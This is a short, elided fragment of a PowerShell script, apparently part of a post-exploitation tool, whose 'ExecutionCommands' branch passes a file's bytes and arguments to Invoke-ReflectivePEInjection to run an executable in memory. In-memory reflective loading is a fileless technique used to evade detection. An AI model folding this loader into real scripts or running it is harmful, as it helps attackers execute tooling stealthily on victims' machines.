...
#>
    ...
    [Parameter(Position = 4, Mandatory=$True, ParameterSetName="WriteContentToDisk")]
    [String]
    $LocalFilePath,
	
	[Parameter(Position = 4, Mandatory=$True, ParameterSetName="ExecutionCommands")]
	[String]
	$CommandArgs
    ...
    Try {
		...
		if ($PsCmdlet.ParameterSetName -eq "WriteContentToDisk")
		{
		...
		if ($PsCmdlet.ParameterSetName -eq "ExecutionCommands")
		{
			# To run the exe in memory use Invoke-ReflectivePEInjection
			$output = Invoke-ReflectivePEInjection -PEBytes $fileBytes -ExeArgs $CommandArgs 
            #Write-Host $output
		}		
